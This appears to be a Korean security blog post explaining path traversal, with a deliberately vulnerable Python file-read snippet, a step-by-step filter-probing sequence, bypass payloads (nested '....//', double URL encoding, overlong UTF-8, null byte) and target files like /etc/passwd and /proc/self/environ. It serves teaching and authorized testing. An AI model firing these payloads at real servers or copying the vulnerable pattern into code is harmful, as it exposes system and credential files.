---
title: "경로 조작 (Path Traversal)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, Path Traversal]
tags: [path-traversal, lfi, web]
description: "사용자 입력이 파일 경로에 들어가 기준 디렉터리를 벗어나는 경로 조작의 개념과, 점·슬래시 필터 파악·널바이트·이중 인코딩 우회 구문을 정리합니다."
mermaid: true
---

> 경로 조작은 사용자 입력이 파일 경로에 들어갈 때 `../` 등으로 의도한 디렉터리를 벗어나 서버의 임의 파일을 읽거나 쓰는 취약점이다.

## 개념

애플리케이션이 사용자 입력을 파일 경로에 그대로 붙이면, 상위 경로 이동 표기(`../`)로 기준 디렉터리 밖으로 나갈 수 있다.

```python
filename = request.args.get("filename", "")
path = "/var/www/files/" + filename   # 입력을 그대로 결합
return open(path).read()
```

`filename`에 `../../../../etc/passwd`를 넣으면 기준 디렉터리를 벗어난다. 읽기에서는 설정 파일·소스·자격 증명이 노출되고, 쓰기(업로드 파일명, 압축 해제)에서는 실행 파일·설정을 덮어써 코드 실행으로 이어질 수 있다.

필터가 `..`나 `/`를 지우더라도, 지우는 방식(1회 치환, 순서, 디코딩 시점)에 허점이 있으면 우회된다. 진단은 필터가 **무엇을 어떻게** 거르는지를 한 문자씩 올려 가며 파악하는 순서로 한다.

## 공격·우회 구문

점검은 허가된 범위에서만 한다.

### 필터 파악 순서

정상값을 기준으로 한 단계씩 올려 가며, 어떤 표기에서 응답이 바뀌는지로 필터를 파악한다.

```
filename=/src/test.png        # 기본값(정상)
filename=/src/.test.png       # '.' 필터링 확인
filename=/src/..test.png      # '..' 필터링 확인
filename=/src/./test.png      # './' 확인
filename=/src/../test.png     # '../' 확인
filename=/src/....//test.png  # '....//' (중첩 제거 우회) 확인
```

### 상위 경로 이동

```
filename=/ss/../src/test.png      # 한 단계 이동이 되는지
filename=/ss/....//src/test.png   # 치환 우회로 이동
```

필터가 `../`를 1회만 제거하면 `....//`가 치환 후 `../`로 남는다.

### 인코딩·널바이트

```
%2e%2e%2f                  # ../ URL 인코딩
%252e%252e%252f            # 이중 URL 인코딩
..%c0%af..%c0%af           # 오버롱 UTF-8 (구형 파서)
```

널바이트로 뒤 경로를 잘라내 확장자·고정 경로 검사를 무력화한다.

```
fileName=test.jpg&filePath=/etc/passwd%00/home/user/app/
```

### 읽을 만한 파일 (Linux 예)

```
/etc/passwd           # 계정 목록
/etc/hosts            # 호스트 매핑
/proc/self/environ    # 프로세스 환경변수
```

## 참고 자료

- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
